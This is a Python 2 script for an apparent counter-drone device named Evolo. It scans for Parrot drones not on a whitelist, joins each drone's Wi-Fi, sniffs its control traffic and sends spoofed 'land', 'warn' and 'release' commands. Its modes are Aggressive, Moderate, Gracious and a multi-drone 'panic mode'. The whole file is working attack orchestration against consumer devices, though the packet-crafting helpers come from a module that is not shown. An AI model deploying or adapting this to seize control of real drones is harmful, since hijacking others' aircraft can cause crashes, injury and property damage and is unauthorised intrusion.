from time import sleep
import threading

from evolo import *

#global constants
interfaceForScan = "wlan0"
interfaceToConnect = "wlan1"

############################
#Process for normal attacks#
############################
def attack(parrotsAP):
	global attackInProgress, underattack
	print "Attack started"
	arduinoLCD("Attack started")
	
	if not connectTo(parrotsAP, interfaceToConnect):
		print "Could not connect to parrot at", parrotsAP.ssid, ", exiting"
		arduinoLCD("Can't connect " + parrotsAP.ssid)
		underattack = []
		attackInProgress = 0
		return
	
	if attackInProgress == 2: #if panic mode started, quit
		return
	
	wifiDistance = getWifiDistance(interfaceToConnect, parrotsAP)
	
	print "Succesfully connected to", parrotsAP.ssid
	arduinoLCD("Connected to " + parrotsAP.ssid)
	
	srcMAC, dstMAC, srcIP, dstIP, segNr = sniffParrotCommunication(interfaceToConnect)
	
	if attackInProgress == 2: #if panic mode started, quit
		return
	
	if srcMAC != "": #only attack if sniffing was successfull. Otherwise simply quit
		if mode == "Aggressive":
			arduinoLCD("Sending land commands")
			sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10) #send 10 land packet
		elif mode == "Moderate":
			arduinoLCD("Sending warn commands")
			sendSpoofedParrotPacket("warn", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
			print "Wait for 5 seconds"
			arduinoLCD("Wait 5 sec")
			sleep(5) #original idea was 10 here, I changed it to 5 for debugging
			print "Wait ended"
			if attackInProgress == 2: #if panic mode started, quit
				return
			print "Send release packet"
			arduinoLCD("Sending release command")
			sendSpoofedParrotPacket("release", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
			print "Wait for 5 seconds"

			sleep(5)
			print "Wait ended"
			if attackInProgress == 2: #if panic mode started, quit
				return
			if getWifiDistance(interfaceToConnect, parrotsAP) > 0: #if the drone is still in wifi range land it
				print "Sending land commands"
				arduinoLCD("Sending land commands")
				sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
		elif mode == "Gracious":
			while getWifiDistance(interfaceToConnect, parrotsAP) > 0: #while the drone is in wifi range
				if wifiDistance * 0.9 > getWifiDistance(interfaceToConnect, parrotsAP): #if it is coming closer, land it
					arduinoLCD("Sending land commands")
					sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
					break
				else: #otherwise warn again
					arduinoLCD("Sending warn commands")
					sendSpoofedParrotPacket("warn", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
					sleep(10)
					
					if attackInProgress == 2: #if panic mode started, quit
						return
					
					arduinoLCD("Sending release command")
					sendSpoofedParrotPacket("release", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
					sleep(5)
					if attackInProgress == 2: #if panic mode started, quit
						return
	else:
		print "No communication toward parrot at ", parrotsAP.ssid, ", exiting"
		arduinoLCD("No com to " + parrotsAP.ssid)
	#if attack finished, clean up the global variables
	underattack = []
	attackInProgress = 0
	disconnectFromWifi(interfaceToConnect)
	print "Attack finished"
	arduinoLCD("Attack finished")

##########################################
#Panic mode if multiple drones are coming#
##########################################
def panicMode():
	global underattack, attackInProgress
	while len(underattack) > 0:
		current = underattack.pop(0) #get the first parrot
		if not connectToByMAC(current, interfaceToConnect):
			continue #skip if unable to connect
		srcMAC, dstMAC, srcIP, dstIP, segNr = sniffParrotCommunication(interfaceToConnect)
		if srcMAC == "":
			continue #skip if sniffing timeouts
		sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 3) #send 3 land packet
	attackInProgress = 0
	disconnectFromWifi(interfaceToConnect)

#####################
#Program starts here#
#####################
if __name__ == '__main__':
	print "Evolo has started"
	startArduino()
	arduinoLCD("Evolo started")
	disconnectFromWifi(interfaceForScan)
	disconnectFromWifi(interfaceToConnect)
	sleep(5)
	print "Evolo is ready for operation"
	arduinoLCD("Evolo is ready")
	global mode, Range, underattack, attackInProgress, attackT
	underattack = []
	attackInProgress = 0 #0 - no attack, 1 - normal attack, 2 - panic mode
	mode = ""
	Range = ""
	while True: #scan, attack, repeat
		mode = readKnobState()
		print "mode: ", mode
		whitelist, Range = readConfig()
		newParrots = scanForParrots(interfaceForScan, whitelist, underattack)
		if len(newParrots) > 0: #only work if there are new drones nearby
			if attackInProgress == 0 and len(newParrots) == 1: #no attack in progress, only one parrot found
				underattack = getAPsMAC(newParrots)
				attackInProgress = 1
				attackT = threading.Thread(target=attack, args=(newParrots[0],)) # launch normal attack
				attackT.daemon = True
				attackT.start()
			elif attackInProgress == 0 and len(newParrots) > 1: #no attack in progress, more than one parrot found -> panic mode
				attackInProgress = 2
				underattack = getAPsMAC(newParrots)
				panicModeT = threading.Thread(target=panicMode, args=())
				panicModeT.daemon = True
				panicModeT.start()
			elif attackInProgress == 1: #if there is a normal attack in progress, but there is an other parrot coming
				attackInProgress = 2
				#attackT.terminate() #can't terminate a thread
				disconnectFromWifi(interfaceToConnect)
				underattack += getAPsMAC(newParrots)
				panicModeT = threading.Thread(target=panicMode, args=())
				panicModeT.daemon = True
				panicModeT.start()
			elif attackInProgress == 2: #already in panic mode, add new parrots
				underattack += getAPsMAC(newParrots)
		else: #no drone: wait and scan again
			sleep(1)
